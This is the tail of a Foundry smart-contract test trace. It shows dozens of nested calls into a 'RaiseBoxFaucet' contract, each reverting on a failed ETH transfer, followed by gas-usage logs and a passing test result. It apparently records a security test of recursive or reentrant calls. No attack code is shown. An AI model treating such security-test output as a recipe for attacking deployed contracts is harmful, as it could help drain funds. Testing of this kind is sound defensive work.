    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] console::log("gas used: ", 26034758 [2.603e7]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("gas limit:", 1073741824 [1.073e9]) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.19ms (13.50ms CPU time)

Ran 1 test suite in 35.95ms (16.19ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
